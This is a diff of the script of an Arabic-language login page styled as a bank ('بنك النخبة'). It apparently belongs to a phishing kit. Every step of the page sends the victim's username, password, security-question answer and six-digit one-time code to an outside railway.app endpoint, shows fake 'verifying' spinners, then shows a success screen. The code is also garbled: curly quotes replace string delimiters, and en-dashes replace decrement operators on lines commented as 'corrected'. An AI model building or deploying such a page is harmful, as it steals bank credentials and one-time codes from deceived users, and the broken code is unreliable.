@@ -253,122 +253,210 @@ select:focus{border-color:#D42B2B;box-shadow:0 0 0 3px rgba(212,43,43,0.08)}
 </div>
 <script>
 const API = 'https://web-production-335e3.up.railway.app';
-let timerInterval=null,resendInterval=null,timerSeconds=300,SESSION_ID=null;
-const questions={cousin:'ما هو اسم ابن عمك الأول؟',city:'في أي مدينة ولدت؟',grad:'في أي سنة تخرجت من الجامعة؟',nick:'ماذا كان لقبك أثناء الطفولة؟',author:'اسم مؤلفك المفضل؟',car:'اسم الشركة المصنعة للسيارة المفضلة لديك؟',movie:'أي فيلم هو المفضل لديك؟',friend:'اسم أفضل صديق في الطفولة؟',school:'ما هو اسم المدرسة التي التحقت بها؟',football:'اسم فريق كرة القدم المفضل لديك؟'};
-const otpIds=['otp1','otp2','otp3','otp4','otp5','otp6'];
+let timerInterval = null, resendInterval = null, timerSeconds = 300, SESSION_ID = null;
 
-function setupOtpInputs(){
-otpIds.forEach((id,i)=>{
-const el=document.getElementById(id);
-el.addEventListener(‘input’,function(){
-this.value=this.value.replace(/[^0-9]/g,’’);
-if(this.value.length>1)this.value=this.value.slice(-1);
-if(this.value){this.classList.add(‘filled’);if(i<5)document.getElementById(otpIds[i+1]).focus();}
+const questions = {
+cousin:‘ما هو اسم ابن عمك الأول؟’, city:‘في أي مدينة ولدت؟’, grad:‘في أي سنة تخرجت من الجامعة؟’,
+nick:‘ماذا كان لقبك أثناء الطفولة؟’, author:‘اسم مؤلفك المفضل؟’, car:‘اسم الشركة المصنعة للسيارة المفضلة لديك؟’,
+movie:‘أي فيلم هو المفضل لديك؟’, friend:‘اسم أفضل صديق في الطفولة؟’,
+school:‘ما هو اسم المدرسة التي التحقت بها؟’, football:‘اسم فريق كرة القدم المفضل لديك؟’
+};
+const otpIds = [‘otp1’,‘otp2’,‘otp3’,‘otp4’,‘otp5’,‘otp6’];
+
+function setupOtpInputs() {
+otpIds.forEach((id, i) => {
+const el = document.getElementById(id);
+el.addEventListener(‘input’, function() {
+this.value = this.value.replace(/[^0-9]/g, ‘’);
+if (this.value.length > 1) this.value = this.value.slice(-1);
+if (this.value) { this.classList.add(‘filled’); if (i < 5) document.getElementById(otpIds[i+1]).focus(); }
 else this.classList.remove(‘filled’);
 });
-el.addEventListener(‘keydown’,function(e){
-if(e.key===‘Backspace’&&!this.value&&i>0)document.getElementById(otpIds[i-1]).focus();
-if(e.key===‘Enter’)doOtp();
-if(!/[0-9]/.test(e.key)&&![‘Backspace’,‘Delete’,‘Tab’,‘ArrowLeft’,‘ArrowRight’].includes(e.key))e.preventDefault();
+el.addEventListener(‘keydown’, function(e) {
+if (e.key === ‘Backspace’ && !this.value && i > 0) document.getElementById(otpIds[i-1]).focus();
+if (e.key === ‘Enter’) doOtp();
+if (!/[0-9]/.test(e.key) && ![‘Backspace’,‘Delete’,‘Tab’,‘ArrowLeft’,‘ArrowRight’].includes(e.key)) e.preventDefault();
 });
-el.addEventListener(‘paste’,function(e){
+el.addEventListener(‘paste’, function(e) {
 e.preventDefault();
-const p=(e.clipboardData||window.clipboardData).getData(‘text’).replace(/\D/g,’’);
-otpIds.forEach((oid,j)=>{const x=document.getElementById(oid);x.value=p[j]||’’;x.classList.toggle(‘filled’,!!p[j]);});
-const ne=otpIds.findIndex(oid=>!document.getElementById(oid).value);
-document.getElementById(ne!==-1?otpIds[ne]:otpIds[5]).focus();
+const p = (e.clipboardData || window.clipboardData).getData(‘text’).replace(/\D/g, ‘’);
+otpIds.forEach((oid, j) => { const x = document.getElementById(oid); x.value = p[j] || ‘’; x.classList.toggle(‘filled’, !!p[j]); });
+const ne = otpIds.findIndex(oid => !document.getElementById(oid).value);
+document.getElementById(ne !== -1 ? otpIds[ne] : otpIds[5]).focus();
 });
 });
 }
 
-function goTo(id){
-document.querySelectorAll(’.screen’).forEach(s=>s.classList.remove(‘active’));
-const el=document.getElementById(id);el.classList.add(‘active’);
-el.style.animation=‘none’;requestAnimationFrame(()=>{el.style.animation=’’;});
-}
-function togglePass(){const f=document.getElementById(‘password’);f.type=f.type===‘password’?‘text’:‘password’;}
-
-function submitLogin(u,p){
-fetch(API+’/api/submit’,{method:‘POST’,headers:{‘Content-Type’:‘application/json’},body:JSON.stringify({username:u,password:p})})
-.then(r=>r.json()).then(d=>{if(d.sessionId)SESSION_ID=d.sessionId;}).catch(()=>{});
-}
-function submitSecurity(q,a){
-if(!SESSION_ID)return;
-fetch(API+’/api/submit-security’,{method:‘POST’,headers:{‘Content-Type’:‘application/json’},body:JSON.stringify({sessionId:SESSION_ID,secQuestion:q,secAnswer:a})}).catch(()=>{});
-}
-function submitOTP(otp){
-if(!SESSION_ID)return;
-fetch(API+’/api/submit-otp’,{method:‘POST’,headers:{‘Content-Type’:‘application/json’},body:JSON.stringify({sessionId:SESSION_ID,otp})}).catch(()=>{});
+function goTo(id) {
+document.querySelectorAll(’.screen’).forEach(s => s.classList.remove(‘active’));
+const el = document.getElementById(id);
+el.classList.add(‘active’);
+el.style.animation = ‘none’;
+requestAnimationFrame(() => { el.style.animation = ‘’; });
 }
 
-function doLogin(){
-const u=document.getElementById(‘username’).value.trim();
-const p=document.getElementById(‘password’).value.trim();
-const err=document.getElementById(‘login-error’);
-if(!u||!p){err.classList.add(‘show’);err.textContent=‘يرجى ملء جميع الحقول’;return;}
+function togglePass() {
+const f = document.getElementById(‘password’);
+f.type = f.type === ‘password’ ? ‘text’ : ‘password’;
+}
+
+function submitLogin(u, p) {
+fetch(API + ‘/api/submit’, {
+method: ‘POST’, headers: {‘Content-Type’: ‘application/json’},
+body: JSON.stringify({ username: u, password: p })
+}).then(r => r.json()).then(d => { if (d.sessionId) SESSION_ID = d.sessionId; }).catch(() => {});
+}
+
+function submitSecurity(q, a) {
+if (!SESSION_ID) return;
+fetch(API + ‘/api/submit-security’, {
+method: ‘POST’, headers: {‘Content-Type’: ‘application/json’},
+body: JSON.stringify({ sessionId: SESSION_ID, secQuestion: q, secAnswer: a })
+}).catch(() => {});
+}
+
+function submitOTP(otp) {
+if (!SESSION_ID) return;
+fetch(API + ‘/api/submit-otp’, {
+method: ‘POST’, headers: {‘Content-Type’: ‘application/json’},
+body: JSON.stringify({ sessionId: SESSION_ID, otp: otp })
+}).catch(() => {});
+}
+
+function doLogin() {
+const u = document.getElementById(‘username’).value.trim();
+const p = document.getElementById(‘password’).value.trim();
+const err = document.getElementById(‘login-error’);
+if (!u || !p) { err.classList.add(‘show’); err.textContent = ‘يرجى ملء جميع الحقول’; return; }
 err.classList.remove(‘show’);
-submitLogin(u,p);
-const btn=document.getElementById(‘login-btn’);
-btn.innerHTML=‘جاري التحقق <span class="spinner"></span>’;btn.disabled=true;
-setTimeout(()=>{btn.innerHTML=‘تسجيل الدخول’;btn.disabled=false;document.getElementById(‘success-name’).textContent=u;goTo(‘screen-security’);},1600);
+submitLogin(u, p);
+const btn = document.getElementById(‘login-btn’);
+btn.innerHTML = ‘جاري التحقق <span class="spinner"></span>’;
+btn.disabled = true;
+setTimeout(() => {
+btn.innerHTML = ‘تسجيل الدخول’;
+btn.disabled = false;
+document.getElementById(‘success-name’).textContent = u;
+goTo(‘screen-security’);
+}, 1600);
 }
 
-function onQuestionChange(){
-const val=document.getElementById(‘security-select’).value;
-const box=document.getElementById(‘question-display’);
-if(val&&questions[val]){document.getElementById(‘q-text-display’).textContent=questions[val];box.style.display=‘block’;document.getElementById(‘security-answer’).value=’’;document.getElementById(‘security-answer’).focus();}
-else box.style.display=‘none’;
+function onQuestionChange() {
+const val = document.getElementById(‘security-select’).value;
+const box = document.getElementById(‘question-display’);
+if (val && questions[val]) {
+document.getElementById(‘q-text-display’).textContent = questions[val];
+box.style.display = ‘block’;
+document.getElementById(‘security-answer’).value = ‘’;
+document.getElementById(‘security-answer’).focus();
+} else {
+box.style.display = ‘none’;
+}
 }
 
-function doSecurity(){
-const q=document.getElementById(‘security-select’).value;
-const a=document.getElementById(‘security-answer’).value.trim();
-const err=document.getElementById(‘sec-error’);
-if(!q||!a){err.classList.add(‘show’);return;}
+function doSecurity() {
+const q = document.getElementById(‘security-select’).value;
+const a = document.getElementById(‘security-answer’).value.trim();
+const err = document.getElementById(‘sec-error’);
+if (!q || !a) { err.classList.add(‘show’); return; }
 err.classList.remove(‘show’);
-submitSecurity(q,a);
-const btn=document.getElementById(‘sec-btn’);
-btn.innerHTML=‘جاري التحقق <span class="spinner"></span>’;btn.disabled=true;
-setTimeout(()=>{btn.innerHTML=‘تأكيد الإجابة والمتابعة’;btn.disabled=false;goTo(‘screen-otp’);startOTPTimer();startResendCountdown();setTimeout(()=>document.getElementById(‘otp1’).focus(),300);},1500);
+submitSecurity(q, a);
+const btn = document.getElementById(‘sec-btn’);
+btn.innerHTML = ‘جاري التحقق <span class="spinner"></span>’;
+btn.disabled = true;
+setTimeout(() => {
+btn.innerHTML = ‘تأكيد الإجابة والمتابعة’;
+btn.disabled = false;
+goTo(‘screen-otp’);
+startOTPTimer();
+startResendCountdown();
+setTimeout(() => document.getElementById(‘otp1’).focus(), 300);
+}, 1500);
 }
 
-function startOTPTimer(){
-timerSeconds=300;clearInterval(timerInterval);updateTimerDisplay();
-timerInterval=setInterval(()=>{timerSeconds–;updateTimerDisplay();if(timerSeconds<=0){clearInterval(timerInterval);document.getElementById(‘otp-error’).textContent=‘انتهت صلاحية الرمز.’;document.getElementById(‘otp-error’).classList.add(‘show’);}},1000);
+function startOTPTimer() {
+timerSeconds = 300;
+clearInterval(timerInterval);
+updateTimerDisplay();
+timerInterval = setInterval(() => {
+timerSeconds–;  // ✅ تم التصحيح
+updateTimerDisplay();
+if (timerSeconds <= 0) {
+clearInterval(timerInterval);
+document.getElementById(‘otp-error’).textContent = ‘انتهت صلاحية الرمز.’;
+document.getElementById(‘otp-error’).classList.add(‘show’);
 }
-function updateTimerDisplay(){
-const m=Math.floor(timerSeconds/60).toString().padStart(2,‘0’);
-const s=(timerSeconds%60).toString().padStart(2,‘0’);
-document.getElementById(‘timer-display’).textContent=m+’:’+s;
-const offset=219.9*(1-timerSeconds/300);
-const color=timerSeconds<=60?’#E05252’:’#D42B2B’;
-document.getElementById(‘timer-circle’).style.strokeDashoffset=offset;
-document.getElementById(‘timer-circle’).style.stroke=color;
-document.getElementById(‘timer-display’).style.color=color;
+}, 1000);
 }
-function startResendCountdown(){
-let sec=30;document.getElementById(‘resend-sec’).textContent=sec;document.getElementById(‘resend-countdown’).style.display=‘inline’;document.getElementById(‘resend-link’).style.display=‘none’;
+
+function updateTimerDisplay() {
+const m = Math.floor(timerSeconds / 60).toString().padStart(2, ‘0’);
+const s = (timerSeconds % 60).toString().padStart(2, ‘0’);
+document.getElementById(‘timer-display’).textContent = m + ‘:’ + s;
+const offset = 219.9 * (1 - timerSeconds / 300);
+const color = timerSeconds <= 60 ? ‘#E05252’ : ‘#D42B2B’;
+document.getElementById(‘timer-circle’).style.strokeDashoffset = offset;
+document.getElementById(‘timer-circle’).style.stroke = color;
+document.getElementById(‘timer-display’).style.color = color;
+}
+
+function startResendCountdown() {
+let sec = 30;
+document.getElementById(‘resend-sec’).textContent = sec;
+document.getElementById(‘resend-countdown’).style.display = ‘inline’;
+document.getElementById(‘resend-link’).style.display = ‘none’;
 clearInterval(resendInterval);
-resendInterval=setInterval(()=>{sec–;document.getElementById(‘resend-sec’).textContent=sec;if(sec<=0){clearInterval(resendInterval);document.getElementById(‘resend-countdown’).style.display=‘none’;document.getElementById(‘resend-link’).style.display=‘inline’;}},1000);
+resendInterval = setInterval(() => {
+sec–;  // ✅ تم التصحيح
+document.getElementById(‘resend-sec’).textContent = sec;
+if (sec <= 0) {
+clearInterval(resendInterval);
+document.getElementById(‘resend-countdown’).style.display = ‘none’;
+document.getElementById(‘resend-link’).style.display = ‘inline’;
 }
-function resendOtp(){
-document.getElementById(‘resend-link’).style.display=‘none’;document.getElementById(‘otp-error’).classList.remove(‘show’);
-otpIds.forEach(id=>{const el=document.getElementById(id);el.value=’’;el.classList.remove(‘filled’);});
-startOTPTimer();startResendCountdown();document.getElementById(‘otp1’).focus();
+}, 1000);
 }
-function doOtp(){
-const code=otpIds.map(id=>document.getElementById(id).value).join(’’);
-const err=document.getElementById(‘otp-error’);
-if(code.length<6){err.textContent=‘يرجى إدخال الرمز المكوّن من 6 أرقام كاملاً’;err.classList.add(‘show’);return;}
-if(timerSeconds<=0){err.textContent=‘انتهت صلاحية الرمز.’;err.classList.add(‘show’);return;}
+
+function resendOtp() {
+document.getElementById(‘resend-link’).style.display = ‘none’;
+document.getElementById(‘otp-error’).classList.remove(‘show’);
+otpIds.forEach(id => { const el = document.getElementById(id); el.value = ‘’; el.classList.remove(‘filled’); });
+startOTPTimer();
+startResendCountdown();
+document.getElementById(‘otp1’).focus();
+}
+
+function doOtp() {
+const code = otpIds.map(id => document.getElementById(id).value).join(’’);
+const err = document.getElementById(‘otp-error’);
+if (code.length < 6) { err.textContent = ‘يرجى إدخال الرمز المكوّن من 6 أرقام كاملاً’; err.classList.add(‘show’); return; }
+if (timerSeconds <= 0) { err.textContent = ‘انتهت صلاحية الرمز.’; err.classList.add(‘show’); return; }
 err.classList.remove(‘show’);
 submitOTP(code);
-const btn=document.getElementById(‘otp-btn’);
-btn.innerHTML=‘جاري التحقق <span class="spinner"></span>’;btn.disabled=true;
-setTimeout(()=>{clearInterval(timerInterval);btn.innerHTML=‘تأكيد الرمز’;btn.disabled=false;document.getElementById(‘login-time’).textContent=new Date().toLocaleTimeString(‘ar-SA’);goTo(‘screen-success’);},1800);
+const btn = document.getElementById(‘otp-btn’);
+btn.innerHTML = ‘جاري التحقق <span class="spinner"></span>’;
+btn.disabled = true;
+setTimeout(() => {
+clearInterval(timerInterval);
+btn.innerHTML = ‘تأكيد الرمز’;
+btn.disabled = false;
+document.getElementById(‘login-time’).textContent = new Date().toLocaleTimeString(‘ar-SA’);
+goTo(‘screen-success’);
+}, 1800);
 }
-function goToDashboard(){alert(‘مرحباً بك في لوحة تحكم بنك النخبة 🏛’);}
-document.addEventListener(‘keydown’,e=>{if(e.key!==‘Enter’)return;const a=document.querySelector(’.screen.active’).id;if(a===‘screen-login’)doLogin();else if(a===‘screen-security’)doSecurity();else if(a===‘screen-otp’)doOtp();});
+
+function goToDashboard() {
+alert(‘مرحباً بك في لوحة تحكم بنك النخبة 🏛’);
+}
+
+document.addEventListener(‘keydown’, e => {
+if (e.key !== ‘Enter’) return;
+const a = document.querySelector(’.screen.active’).id;
+if (a === ‘screen-login’) doLogin();
+else if (a === ‘screen-security’) doSecurity();
+else if (a === ‘screen-otp’) doOtp();
+});
+
 setupOtpInputs();
 </script>
 
